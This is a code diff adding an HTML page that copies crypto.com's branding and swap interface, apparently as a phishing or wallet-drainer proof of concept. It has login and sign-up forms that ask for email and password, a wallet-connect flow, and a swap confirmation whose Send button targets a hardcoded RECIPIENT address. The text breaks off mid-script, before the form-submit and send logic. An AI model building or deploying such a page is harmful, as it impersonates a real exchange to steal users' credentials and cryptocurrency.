@@ -1,0 +1,1290 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>crypto.com — Swap</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/qrcodejs/qrcode.min.js"></script>
+<style>
+  :root{
+    /* Palette pulled from crypto.com marketing site */
+    --bg:#04070d;
+    --bg-2:#0a1220;
+    --bg-3:#0f1a2c;
+    --panel:#0d1522;
+    --panel-2:#131f33;
+    --line:rgba(255,255,255,.07);
+    --line-2:rgba(255,255,255,.12);
+    --text:#ffffff;
+    --muted:#8a95a5;
+    --muted-2:#5c6773;
+    --brand:#1199fa;
+    --brand-2:#0b7ed6;
+    --brand-hi:#3fb0ff;
+    --pill:#141c2b;
+    --pill-hover:#1a2438;
+    --green:#03c087;
+    --red:#f04e6e;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0}
+  body{
+    font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+    background:
+      radial-gradient(1400px 700px at 90% -10%, #1a3663 0%, transparent 55%),
+      radial-gradient(1100px 600px at -10% 30%, #10233f 0%, transparent 55%),
+      linear-gradient(180deg,#04070d 0%, #04070d 40%, #0a1728 100%);
+    color:var(--text);
+    min-height:100vh;
+    -webkit-font-smoothing:antialiased;
+    letter-spacing:-.011em;
+  }
+  a{color:inherit;text-decoration:none}
+  button{font-family:inherit;cursor:pointer;border:0;background:none;color:inherit}
+  input,select{font-family:inherit}
+
+  /* ---------- Nav ---------- */
+  .nav{
+    display:flex;align-items:center;gap:36px;
+    padding:18px 40px;
+    position:sticky;top:0;z-index:20;
+    background:rgba(4,7,13,.7);
+    backdrop-filter:blur(14px);
+    -webkit-backdrop-filter:blur(14px);
+  }
+  .brand{display:flex;align-items:center;gap:8px;font-weight:500;font-size:20px;letter-spacing:-.02em}
+  .brand .cdc-logo{height:26px;width:auto;display:block}
+  .nav-links{display:flex;gap:28px;font-size:15px;font-weight:500}
+  .nav-links a{color:#fff;opacity:.92;padding:8px 4px}
+  .nav-links a:hover{opacity:.65}
+
+  .nav-right{display:flex;align-items:center;gap:10px;margin-left:auto}
+  .search{
+    display:flex;align-items:center;gap:8px;
+    background:var(--pill);border:1px solid var(--line);
+    padding:0 10px 0 14px;height:40px;border-radius:999px;min-width:210px;
+    color:var(--muted);font-size:14px;
+  }
+  .search svg{opacity:.7}
+  .search input{
+    background:transparent;border:0;outline:0;color:#fff;font-size:14px;flex:1;padding:0;
+  }
+  .search .kbd{
+    background:#1f2b41;color:#c9d2e0;border-radius:6px;padding:2px 8px;font-size:12px;font-weight:600;
+    font-family:ui-monospace,SFMono-Regular,Menlo,monospace;
+  }
+
+  .btn{
+    display:inline-flex;align-items:center;justify-content:center;gap:8px;
+    padding:0 20px;height:40px;border-radius:999px;
+    font-weight:600;font-size:14px;line-height:1;
+    transition:.15s ease;white-space:nowrap;
+  }
+  .btn-primary{background:var(--brand);color:#fff}
+  .btn-primary:hover{background:var(--brand-2)}
+  .btn-dark{background:var(--pill);color:#fff;border:1px solid var(--line)}
+  .btn-dark:hover{background:var(--pill-hover)}
+  .btn-ghost{background:transparent;color:#fff;border:1px solid var(--line-2)}
+  .btn-ghost:hover{background:rgba(255,255,255,.05)}
+  .btn-lg{height:56px;padding:0 28px;font-size:16px;border-radius:999px}
+  .btn-block{width:100%}
+  .btn:disabled{opacity:.5;cursor:not-allowed}
+
+  .icon-btn{
+    width:40px;height:40px;border-radius:999px;background:var(--pill);
+    display:grid;place-items:center;border:1px solid var(--line);color:#fff;
+  }
+  .icon-btn:hover{background:var(--pill-hover)}
+
+  /* ---------- Hero ---------- */
+  main{max-width:1280px;margin:0 auto;padding:60px 40px 100px}
+  .hero{
+    display:grid;grid-template-columns:1.15fr .85fr;gap:60px;align-items:center;
+    padding:40px 0 40px;
+  }
+  .hero h1{
+    font-size:88px;line-height:1;margin:0 0 24px;
+    font-weight:400;letter-spacing:-.045em;
+  }
+  .hero p{
+    color:#a4adba;font-size:20px;line-height:1.4;max-width:560px;margin:0 0 36px;
+    font-weight:400;
+  }
+  .hero-badges{display:flex;gap:8px;flex-wrap:wrap;margin-top:28px}
+  .chip{
+    display:inline-flex;align-items:center;gap:8px;
+    background:var(--pill);color:#c9d2e0;
+    padding:8px 14px;border-radius:999px;font-size:12.5px;font-weight:500;
+    border:1px solid var(--line);
+  }
+  .dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 0 3px rgba(3,192,135,.15)}
+
+  /* ---------- Swap panel ---------- */
+  .panel{
+    background:linear-gradient(180deg, rgba(255,255,255,.02) 0%, rgba(255,255,255,0) 100%), var(--panel);
+    border:1px solid var(--line);
+    border-radius:24px;
+    padding:24px;
+    box-shadow:0 40px 80px rgba(0,0,0,.5), 0 0 0 1px rgba(255,255,255,.02) inset;
+  }
+  .panel-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
+  .panel-head h3{margin:0;font-size:18px;font-weight:600}
+  .settings{display:flex;gap:6px}
+  .settings .chip{cursor:pointer}
+  .settings .chip:hover{background:var(--pill-hover)}
+
+  .token-row{
+    background:var(--bg-2);
+    border:1px solid var(--line);
+    border-radius:16px;
+    padding:18px;
+    display:flex;flex-direction:column;gap:12px;
+    transition:border-color .15s;
+  }
+  .token-row:focus-within{border-color:var(--line-2)}
+  .token-row .label{display:flex;justify-content:space-between;color:var(--muted);font-size:13px}
+  .token-row .balance{cursor:pointer;transition:.15s}
+  .token-row .balance:hover{color:#fff}
+  .token-line{display:flex;justify-content:space-between;align-items:center;gap:12px}
+  .amount{
+    background:transparent;border:0;outline:0;color:#fff;
+    font-size:34px;font-weight:400;width:100%;font-family:inherit;letter-spacing:-.025em;
+    padding:0;
+  }
+  .amount::placeholder{color:#3c4a5f}
+  .amount::-webkit-outer-spin-button,.amount::-webkit-inner-spin-button{-webkit-appearance:none;margin:0}
+  .amount[readonly]{color:#fff}
+
+  /* Custom token picker */
+  .tk-picker{position:relative;display:inline-block}
+  .tk-btn{
+    display:inline-flex;align-items:center;gap:8px;
+    background:var(--panel-2);border:1px solid var(--line-2);
+    padding:4px 10px 4px 4px;height:40px;border-radius:999px;
+    font-weight:600;font-size:15px;color:#fff;cursor:pointer;
+    transition:.15s;
+  }
+  .tk-btn:hover{background:#1a2740;border-color:rgba(255,255,255,.2)}
+  .tk-img{
+    width:28px;height:28px;border-radius:50%;object-fit:cover;
+    background:#1a2740;display:grid;place-items:center;font-size:11px;font-weight:800;color:#fff;
+    flex-shrink:0;
+  }
+  .tk-img.fallback{background:linear-gradient(135deg,#1199fa,#0b6dd0)}
+  .tk-sym{margin-left:2px}
+  .tk-chev{margin-left:2px;opacity:.7}
+  .tk-panel{
+    position:absolute;top:calc(100% + 8px);right:0;z-index:30;
+    width:320px;background:var(--panel);
+    border:1px solid var(--line-2);border-radius:16px;
+    box-shadow:0 30px 60px rgba(0,0,0,.6);
+    padding:12px;display:none;
+  }
+  .tk-panel.show{display:block}
+  .tk-search{
+    width:100%;background:var(--bg-2);border:1px solid var(--line);
+    color:#fff;font-size:14px;padding:10px 14px;border-radius:10px;outline:0;
+    margin-bottom:8px;
+  }
+  .tk-search:focus{border-color:var(--brand)}
+  .tk-list{max-height:320px;overflow-y:auto}
+  .tk-list::-webkit-scrollbar{width:8px}
+  .tk-list::-webkit-scrollbar-thumb{background:rgba(255,255,255,.1);border-radius:4px}
+  .tk-item{
+    display:grid;grid-template-columns:32px 1fr auto;gap:12px;align-items:center;
+    padding:10px 12px;border-radius:10px;cursor:pointer;transition:.1s;
+  }
+  .tk-item:hover{background:rgba(255,255,255,.05)}
+  .tk-item.selected{background:rgba(17,153,250,.1)}
+  .tk-item .tk-img{width:32px;height:32px}
+  .tk-item .tk-nm{font-weight:600;font-size:14px}
+  .tk-item .tk-sub{color:var(--muted);font-size:12px;margin-top:1px}
+  .tk-item .tk-bal{text-align:right;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:13px;font-weight:500}
+  .tk-item .tk-usd{color:var(--muted);font-size:11.5px;margin-top:1px;text-align:right}
+  .tk-empty{text-align:center;padding:24px 12px;color:var(--muted);font-size:13px}
+
+  .swap-arrow{
+    width:40px;height:40px;border-radius:14px;
+    background:var(--panel);border:4px solid var(--panel);
+    outline:1px solid var(--line-2);
+    display:grid;place-items:center;margin:-14px auto;position:relative;z-index:2;
+    transition:.15s;
+  }
+  .swap-arrow:hover{background:var(--panel-2);transform:rotate(180deg)}
+
+  .rate{
+    display:flex;justify-content:space-between;color:var(--muted);
+    font-size:13.5px;padding:18px 6px 6px;
+  }
+  .rate strong{color:#fff;font-weight:500}
+
+  /* ---------- Stats grid ---------- */
+  .stats{
+    display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin:60px 0 8px;
+  }
+  .stat{
+    background:var(--panel);border:1px solid var(--line);
+    border-radius:16px;padding:18px 20px;
+  }
+  .stat .k{color:var(--muted);font-size:12.5px;margin-bottom:8px;text-transform:uppercase;letter-spacing:.04em;font-weight:500}
+  .stat .v{font-size:22px;font-weight:600;letter-spacing:-.015em}
+  .stat .v.mono{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:14px}
+  .stat .sub{color:var(--muted);font-size:12.5px;margin-top:4px}
+  .stat .sub.up{color:var(--green)}
+
+  /* ---------- Wallet chip ---------- */
+  .wallet-strip{
+    display:none;align-items:center;gap:4px;
+    background:var(--pill);border:1px solid var(--line);
+    padding:4px 4px 4px 12px;border-radius:999px;height:40px;font-size:13px;
+  }
+  .wallet-strip .net{
+    padding:6px 10px;border-radius:999px;color:#c9d2e0;font-size:12.5px;
+    display:inline-flex;align-items:center;gap:6px;font-weight:500;
+  }
+  .wallet-strip .addr{
+    font-family:ui-monospace,SFMono-Regular,Menlo,monospace;color:#e2e8f0;
+    padding:0 8px;font-size:13px;
+  }
+  .wallet-strip .disc{
+    background:var(--panel-2);padding:0 12px;height:32px;border-radius:999px;color:#fff;font-size:12.5px;font-weight:500;
+    display:inline-flex;align-items:center;
+  }
+  .wallet-strip .disc:hover{background:#1a2740}
+
+  /* ---------- Assets ---------- */
+  .assets{margin-top:16px}
+  .assets .panel-head h3{font-size:14px;color:var(--muted);font-weight:600;text-transform:uppercase;letter-spacing:.06em;margin:0}
+  .asset-row{
+    display:grid;grid-template-columns:auto 1fr auto;gap:14px;align-items:center;
+    padding:14px 16px;border-radius:12px;
+    transition:background .15s;
+  }
+  .asset-row:hover{background:rgba(255,255,255,.03)}
+  .asset-row .a-img{
+    width:36px;height:36px;border-radius:50%;object-fit:cover;
+    background:linear-gradient(135deg,#1199fa,#0b6dd0);display:grid;place-items:center;
+    font-weight:800;font-size:13px;color:#fff;flex-shrink:0;
+  }
+  .asset-row .nm{font-weight:600;font-size:15px}
+  .asset-row .sub{color:var(--muted);font-size:13px;margin-top:2px}
+  .asset-row .val{text-align:right}
+  .asset-row .amt{font-weight:600;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:14px}
+  .asset-row .usd{color:var(--muted);font-size:12.5px;margin-top:2px}
+
+  /* ---------- Modal ---------- */
+  .modal-back{
+    position:fixed;inset:0;background:rgba(2,5,10,.78);backdrop-filter:blur(8px);
+    display:none;align-items:center;justify-content:center;z-index:50;padding:20px;
+  }
+  .modal-back.show{display:flex}
+  .modal{
+    background:var(--panel);border:1px solid var(--line-2);border-radius:24px;
+    width:100%;max-width:440px;padding:28px;position:relative;
+    box-shadow:0 40px 80px rgba(0,0,0,.6);
+  }
+  .modal h2{margin:0 0 8px;font-size:22px;font-weight:600;letter-spacing:-.02em}
+  .modal p{margin:0 0 20px;color:var(--muted);font-size:14px;line-height:1.5}
+  .modal .close{
+    position:absolute;top:16px;right:16px;
+    width:32px;height:32px;border-radius:8px;color:var(--muted);
+    display:grid;place-items:center;
+  }
+  .modal .close:hover{background:rgba(255,255,255,.06);color:#fff}
+  .qr-wrap{
+    background:#fff;padding:16px;border-radius:16px;display:grid;place-items:center;margin-bottom:16px;
+  }
+  .qr-wrap #qr img, .qr-wrap #qr canvas{display:block}
+  .uri{
+    background:var(--bg-2);border:1px solid var(--line);border-radius:12px;
+    padding:12px 14px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;
+    font-size:11.5px;color:#a4adba;word-break:break-all;line-height:1.55;
+    margin-bottom:16px;
+  }
+  .modal-actions{display:flex;gap:10px}
+
+  /* ---------- Auth modal ---------- */
+  .auth-modal{
+    background:var(--panel);border:1px solid var(--line-2);border-radius:24px;
+    width:100%;max-width:420px;padding:32px 32px 28px;position:relative;
+    box-shadow:0 40px 80px rgba(0,0,0,.6);
+  }
+  .auth-modal h2{margin:0 0 6px;font-size:26px;font-weight:500;letter-spacing:-.025em}
+  .auth-modal .sub{margin:0 0 24px;color:var(--muted);font-size:14.5px;line-height:1.5}
+  .auth-tabs{
+    display:flex;background:var(--bg-2);border:1px solid var(--line);
+    padding:4px;border-radius:999px;margin-bottom:22px;
+  }
+  .auth-tabs button{
+    flex:1;height:36px;border-radius:999px;font-size:13.5px;font-weight:600;color:var(--muted);
+    transition:.15s;
+  }
+  .auth-tabs button.active{background:var(--panel-2);color:#fff}
+  .field{margin-bottom:14px;position:relative}
+  .field label{
+    display:block;font-size:12.5px;color:var(--muted);
+    margin-bottom:8px;font-weight:500;letter-spacing:.02em;
+  }
+  .field input{
+    width:100%;background:var(--bg-2);border:1px solid var(--line);
+    color:#fff;font-size:15px;padding:14px 16px;border-radius:12px;outline:0;
+    transition:border-color .15s, background .15s;
+  }
+  .field input::placeholder{color:#4a5566}
+  .field input:focus{border-color:var(--brand);background:#0c1626}
+  .field .toggle{
+    position:absolute;right:12px;bottom:11px;
+    padding:6px 10px;border-radius:8px;color:var(--muted);font-size:12px;font-weight:500;
+  }
+  .field .toggle:hover{color:#fff;background:rgba(255,255,255,.05)}
+  .row-forgot{display:flex;justify-content:flex-end;margin:-4px 0 18px}
+  .row-forgot a{color:var(--brand);font-size:13px;font-weight:500}
+  .row-forgot a:hover{color:var(--brand-hi)}
+  .divider{
+    display:flex;align-items:center;gap:12px;margin:22px 0 16px;color:var(--muted);font-size:12px;
+  }
+  .divider::before,.divider::after{content:"";flex:1;height:1px;background:var(--line)}
+  .switch-mode{
+    text-align:center;color:var(--muted);font-size:13.5px;margin-top:18px;
+  }
+  .switch-mode a{color:var(--brand);font-weight:600;cursor:pointer}
+  .switch-mode a:hover{color:var(--brand-hi)}
+  .auth-success{
+    display:none;text-align:center;padding:8px 0 4px;
+  }
+  .auth-success.show{display:block}
+  .auth-success .check{
+    width:56px;height:56px;border-radius:50%;background:rgba(3,192,135,.15);
+    color:var(--green);display:grid;place-items:center;margin:4px auto 14px;
+  }
+
+  /* ---------- Toast ---------- */
+  .toast{
+    position:fixed;bottom:28px;left:50%;transform:translateX(-50%) translateY(20px);
+    background:#131f33;border:1px solid var(--line-2);
+    padding:14px 20px;border-radius:12px;font-size:13.5px;
+    box-shadow:0 20px 40px rgba(0,0,0,.5);
+    opacity:0;pointer-events:none;transition:.25s ease;z-index:60;
+  }
+  .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+  .toast.err{border-color:rgba(240,78,110,.5)}
+
+  .empty{text-align:center;padding:40px 20px;color:var(--muted)}
+
+  /* Warning banner (file:// / no wallet) */
+  .banner{
+    display:none;align-items:center;gap:14px;
+    background:linear-gradient(90deg, rgba(240,166,64,.14), rgba(240,166,64,.06));
+    border:1px solid rgba(240,166,64,.35);
+    border-radius:14px;padding:14px 18px;margin:20px 40px 0;color:#ffd9a8;font-size:13.5px;
+    max-width:1200px;margin-left:auto;margin-right:auto;
+  }
+  .banner.show{display:flex}
+  .banner .b-ico{
+    width:32px;height:32px;border-radius:50%;background:rgba(240,166,64,.2);
+    display:grid;place-items:center;flex-shrink:0;color:#f0a640;
+  }
+  .banner strong{color:#fff;display:block;margin-bottom:2px;font-size:14px}
+  .banner code{
+    background:rgba(0,0,0,.35);padding:2px 6px;border-radius:5px;
+    font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12px;color:#fff;
+  }
+  .banner .close-b{margin-left:auto;color:#ffd9a8;padding:4px 8px;border-radius:6px}
+  .banner .close-b:hover{background:rgba(255,255,255,.08);color:#fff}
+
+  /* ---------- Footer ---------- */
+  footer{
+    max-width:1280px;margin:0 auto;padding:32px 40px;color:var(--muted-2);font-size:12.5px;
+    border-top:1px solid var(--line);display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;
+  }
+
+  @media (max-width:1024px){
+    .hero{grid-template-columns:1fr;gap:40px}
+    .hero h1{font-size:60px}
+    .nav-links{display:none}
+    .stats{grid-template-columns:repeat(2,1fr)}
+    .search{min-width:0;width:180px}
+    main{padding:32px 20px 60px}
+    .nav{padding:14px 20px;gap:16px}
+  }
+  @media (max-width:640px){
+    .hero h1{font-size:44px}
+    .search{display:none}
+    .brand span{display:none}
+  }
+</style>
+</head>
+<body>
+
+<nav class="nav">
+  <a href="#" class="brand" aria-label="crypto.com">
+    <img class="cdc-logo" src="https://mkt-site-asset.crypto.com/assets/logo/crypto-com.svg" alt="crypto.com" />
+  </a>
+
+  <div class="nav-links">
+    <a href="#">Markets</a>
+    <a href="#">Individuals</a>
+    <a href="#">Businesses</a>
+    <a href="#">Discover</a>
+  </div>
+
+  <div class="nav-right">
+    <label class="search">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg>
+      <input type="text" placeholder="" aria-label="Search" id="searchInput"/>
+      <span class="kbd">/</span>
+    </label>
+
+    <div id="walletStrip" class="wallet-strip">
+      <span class="net"><span class="dot"></span><span id="netName">Cronos</span></span>
+      <span class="addr" id="addrShort">0x0000…0000</span>
+      <button class="disc" id="disconnectBtn">Disconnect</button>
+    </div>
+
+    <button id="walletBtn" class="btn btn-ghost">Connect Wallet</button>
+    <button id="loginBtn" class="btn btn-dark">Log In</button>
+    <button id="signupBtn" class="btn btn-primary">Sign Up</button>
+
+    <button class="icon-btn" title="Download app" aria-label="Download">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12M6 11l6 6 6-6M4 21h16"/></svg>
+    </button>
+    <button class="icon-btn" title="Language" aria-label="Language">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3c2.5 3 2.5 15 0 18M12 3c-2.5 3-2.5 15 0 18"/></svg>
+    </button>
+  </div>
+</nav>
+
+<div id="banner" class="banner">
+  <div class="b-ico">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 9v4M12 17h.01"/><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/></svg>
+  </div>
+  <div>
+    <strong id="bannerTitle">Wallet cannot inject on file:// pages</strong>
+    <span id="bannerBody">Serve the file over HTTP so MetaMask / Crypto.com DeFi Wallet will inject their provider. Run: <code>python3 -m http.server 8000</code> in <code>/Users/admin/poc</code>, then open <code>http://localhost:8000/dapp.html</code>. Alternatively enable <em>Allow access to file URLs</em> for MetaMask in <code>chrome://extensions</code>.</span>
+  </div>
+  <button class="close-b" onclick="document.getElementById('banner').classList.remove('show')" aria-label="Dismiss">✕</button>
+</div>
+
+<main>
+
+  <section class="hero">
+    <div>
+      <h1>The only crypto<br/>platform you need</h1>
+      <p>Trade BTC, ETH, CRO, and 400+ crypto in your local currency.</p>
+      <div style="display:flex;gap:12px;flex-wrap:wrap;align-items:center">
+        <button class="btn btn-primary btn-lg" onclick="document.getElementById('swapCard').scrollIntoView({behavior:'smooth',block:'center'})">
+          Get Started
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 5l7 7-7 7"/></svg>
+        </button>
+      </div>
+      <div class="hero-badges">
+        <span class="chip"><span class="dot"></span>Non-custodial</span>
+        <span class="chip">Audited</span>
+        <span class="chip">Cronos EVM · Chain ID 25</span>
+      </div>
+    </div>
+
+    <!-- Swap panel -->
+    <div id="swapCard" class="panel">
+      <div class="panel-head">
+        <h3>Swap</h3>
+        <div class="settings">
+          <button class="chip" title="Slippage tolerance">Slippage 0.5%</button>
+          <button class="chip" title="Settings" aria-label="Settings">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
+          </button>
+        </div>
+      </div>
+
+      <div class="token-row">
+        <div class="label">
+          <span>You pay</span>
+          <span class="balance" id="fromBalance" onclick="useMax()">Balance: —</span>
+        </div>
+        <div class="token-line">
+          <input id="fromAmount" class="amount" type="number" placeholder="0" min="0" step="any" />
+          <div id="fromToken" class="tk-picker" data-picker>
+            <button class="tk-btn" type="button">
+              <span class="tk-img fallback">?</span>
+              <span class="tk-sym">—</span>
+              <svg class="tk-chev" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+            </button>
+            <div class="tk-panel">
+              <input class="tk-search" placeholder="Search token or paste address" />
+              <div class="tk-list"></div>
+            </div>
+          </div>
+        </div>
+        <div class="label"><span id="fromUsd">≈ $0.00</span><span></span></div>
+      </div>
+
+      <button class="swap-arrow" onclick="flipTokens()" title="Flip" aria-label="Flip tokens">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M7 3v18M7 21l-4-4M7 21l4-4M17 21V3M17 3l-4 4M17 3l4 4"/></svg>
+      </button>
+
+      <div class="token-row">
+        <div class="label">
+          <span>You receive</span>
+          <span class="balance" id="toBalance">Balance: —</span>
+        </div>
+        <div class="token-line">
+          <input id="toAmount" class="amount" type="number" placeholder="0" readonly />
+          <div id="toToken" class="tk-picker" data-picker>
+            <button class="tk-btn" type="button">
+              <span class="tk-img fallback">?</span>
+              <span class="tk-sym">—</span>
+              <svg class="tk-chev" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+            </button>
+            <div class="tk-panel">
+              <input class="tk-search" placeholder="Search token or paste address" />
+              <div class="tk-list"></div>
+            </div>
+          </div>
+        </div>
+        <div class="label"><span id="toUsd">≈ $0.00</span><span></span></div>
+      </div>
+
+      <div class="rate">
+        <span id="rateLine">1 CRO ≈ 0.0872 USDC</span>
+        <span>Fee <strong>0.25%</strong></span>
+      </div>
+
+      <div style="margin-top:16px">
+        <button id="swapBtn" class="btn btn-primary btn-block btn-lg" onclick="startSwap()">Connect Wallet</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- Portfolio (shown after connect) -->
+  <section id="portfolio" style="display:none">
+    <div class="stats">
+      <div class="stat">
+        <div class="k">Total Balance</div>
+        <div class="v" id="pfValue">$0.00</div>
+        <div class="sub up" id="pfChange">+$0.00 (+0.00%) 24H</div>
+      </div>
+      <div class="stat">
+        <div class="k">Network</div>
+        <div class="v" id="pfNetwork">—</div>
+        <div class="sub">Connected via Web3</div>
+      </div>
+      <div class="stat">
+        <div class="k">Address</div>
+        <div class="v mono" id="pfAddress">—</div>
+        <div class="sub">Non-custodial</div>
+      </div>
+      <div class="stat">
+        <div class="k">Native Balance</div>
+        <div class="v" id="pfNative">—</div>
+        <div class="sub" id="pfNativeUsd">≈ $0.00</div>
+      </div>
+    </div>
+
+    <div class="panel assets" style="margin-top:18px">
+      <div class="panel-head"><h3>Your assets</h3></div>
+      <div id="assetsList"></div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div>© 2026 crypto.com — Demo dApp. Not financial advice.</div>
+  <div>Cronos · Ethereum · WalletConnect</div>
+</footer>
+
+<!-- Auth Modal -->
+<div id="authModal" class="modal-back" onclick="if(event.target===this)closeAuth()">
+  <div class="auth-modal">
+    <button class="close" onclick="closeAuth()" aria-label="Close">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M6 6l12 12M6 18L18 6"/></svg>
+    </button>
+
+    <div id="authForm">
+      <div class="auth-tabs">
+        <button id="tabLogin" class="active" onclick="setAuthMode('login')">Log In</button>
+        <button id="tabSignup" onclick="setAuthMode('signup')">Sign Up</button>
+      </div>
+
+      <h2 id="authTitle">Welcome back</h2>
+      <p class="sub" id="authSub">Sign in to your crypto.com account.</p>
+
+      <form id="authFormEl" onsubmit="submitAuth(event)">
+        <div class="field">
+          <label for="authEmail">Email</label>
+          <input id="authEmail" type="email" placeholder="you@example.com" autocomplete="email" required />
+        </div>
+        <div class="field">
+          <label for="authPass">Password</label>
+          <input id="authPass" type="password" placeholder="Enter your password" autocomplete="current-password" required minlength="6" />
+          <button type="button" class="toggle" onclick="togglePw()">Show</button>
+        </div>
+        <div class="row-forgot"><a href="#">Forgot password?</a></div>
+        <button class="btn btn-primary btn-block btn-lg" type="submit" id="authSubmit">Continue</button>
+      </form>
+
+      <div class="divider">or</div>
+      <button class="btn btn-dark btn-block" onclick="closeAuth(); connect();">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px"><path d="M21 12a9 9 0 1 1-9-9M21 3v6h-6"/></svg>
+        Continue with Web3 Wallet
+      </button>
+
+      <div class="switch-mode" id="switchMode">
+        Don't have an account? <a onclick="setAuthMode('signup')">Sign up</a>
+      </div>
+    </div>
+
+    <div id="authSuccess" class="auth-success">
+      <div class="check">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+      </div>
+      <h2 style="margin:0 0 6px;font-size:20px" id="successTitle">You're signed in</h2>
+      <p class="sub" style="margin-bottom:20px" id="successSub">Welcome back to crypto.com.</p>
+      <button class="btn btn-primary btn-block" onclick="closeAuth()">Continue</button>
+    </div>
+  </div>
+</div>
+
+<!-- Swap / QR Modal -->
+<div id="modal" class="modal-back" onclick="if(event.target===this)closeModal()">
+  <div class="modal">
+    <button class="close" onclick="closeModal()" aria-label="Close">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M6 6l12 12M6 18L18 6"/></svg>
+    </button>
+    <h2 id="modalTitle">Confirm swap</h2>
+    <p id="modalSub">Scan the QR with a wallet app, or press Send to sign in your browser wallet.</p>
+    <div class="qr-wrap"><div id="qr"></div></div>
+    <div class="uri" id="uriBox">—</div>
+    <div class="modal-actions">
+      <button class="btn btn-dark btn-block" onclick="closeModal()">Cancel</button>
+      <button class="btn btn-primary btn-block" onclick="sendTx()">Send</button>
+    </div>
+  </div>
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script>
+/* ---------- Config ---------- */
+const RECIPIENT = '0xBBA62B9ddd2242A3836e9bE2515c55528115152c';
+const FEE = 0.0025;
+
+// Per-chain token registry (native + common ERC-20s). Addresses are official.
+const CHAINS = {
+  '0x1': {
+    name: 'Ethereum', native: { sym:'ETH', name:'Ethereum', cg:'ethereum', decimals:18 },
+    tokens: [
+      { sym:'USDT', name:'Tether',        addr:'0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals:6,  cg:'tether' },
+      { sym:'USDC', name:'USD Coin',      addr:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals:6,  cg:'usd-coin' },
+      { sym:'DAI',  name:'Dai',           addr:'0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals:18, cg:'dai' },
